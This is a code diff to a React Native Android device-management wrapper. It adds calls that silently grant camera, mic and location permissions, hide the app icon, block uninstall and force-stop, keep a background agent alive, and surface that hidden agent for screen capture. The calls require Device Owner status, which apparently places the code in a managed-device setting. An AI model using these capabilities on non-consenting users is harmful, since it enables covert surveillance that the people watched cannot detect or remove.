@@ -19,6 +19,21 @@ type DeviceManagementNative = {
   reboot(): Promise<boolean>;
   wipeDevice(external: boolean): Promise<boolean>;
   setCameraDisabled(disabled: boolean): Promise<boolean>;
+  grantRuntimePermissions(): Promise<number>;
+  setLauncherIconHidden(hidden: boolean): Promise<boolean>;
+  setUninstallBlocked(blocked: boolean): Promise<boolean>;
+  setUserControlDisabled(disabled: boolean): Promise<boolean>;
+  applyManagedAgentPolicy(hideIcon: boolean): Promise<ManagedPolicyResult>;
+  startAgentService(): Promise<boolean>;
+  stopAgentService(): Promise<boolean>;
+  launchAgentActivity(): Promise<boolean>;
+};
+
+export type ManagedPolicyResult = {
+  deviceOwner: boolean;
+  uninstallBlocked?: boolean;
+  forceStopDisabled?: boolean;
+  iconHidden?: boolean;
 };
 
 const Native = (NativeModules.DeviceManagementModule || null) as DeviceManagementNative | null;
@@ -55,5 +70,50 @@ export const DeviceManagement = {
   },
   setCameraDisabled(disabled: boolean): Promise<boolean> {
     return Native ? Native.setCameraDisabled(disabled) : Promise.resolve(false);
+  },
+  /**
+   * Silently grants the app's own runtime permissions when it is Device Owner
+   * (camera, mic, location, notifications…). Resolves the count granted, or 0 on
+   * a device where the app is not owner (the normal prompts then apply).
+   */
+  grantRuntimePermissions(): Promise<number> {
+    return Native ? Native.grantRuntimePermissions() : Promise.resolve(0);
+  },
+  /** Hides/shows the launcher icon (disables the launcher alias). */
+  setLauncherIconHidden(hidden: boolean): Promise<boolean> {
+    return Native ? Native.setLauncherIconHidden(hidden) : Promise.resolve(false);
+  },
+  /** Blocks the user uninstalling the app (Device Owner only). */
+  setUninstallBlocked(blocked: boolean): Promise<boolean> {
+    return Native ? Native.setUninstallBlocked(blocked) : Promise.resolve(false);
+  },
+  /** Stops the user force-stopping the app (Device Owner, Android 11+). */
+  setUserControlDisabled(disabled: boolean): Promise<boolean> {
+    return Native ? Native.setUserControlDisabled(disabled) : Promise.resolve(false);
+  },
+  /**
+   * Applies the full managed-agent profile at once (block uninstall, disable
+   * force-stop, optionally hide the launcher icon). No-op fields on non-owner
+   * devices. Returns what was actually applied.
+   */
+  applyManagedAgentPolicy(hideIcon: boolean): Promise<ManagedPolicyResult> {
+    return Native
+      ? Native.applyManagedAgentPolicy(hideIcon)
+      : Promise.resolve({deviceOwner: false});
+  },
+  /** Starts the background keep-alive foreground service (device stays online). */
+  startAgentService(): Promise<boolean> {
+    return Native ? Native.startAgentService() : Promise.resolve(false);
+  },
+  /** Stops the background keep-alive service. */
+  stopAgentService(): Promise<boolean> {
+    return Native ? Native.stopAgentService() : Promise.resolve(false);
+  },
+  /**
+   * Brings the agent's Activity to the foreground. Needed before screen capture
+   * on a hidden/background agent — MediaProjection requires a resumed Activity.
+   */
+  launchAgentActivity(): Promise<boolean> {
+    return Native ? Native.launchAgentActivity() : Promise.resolve(false);
   },
 };
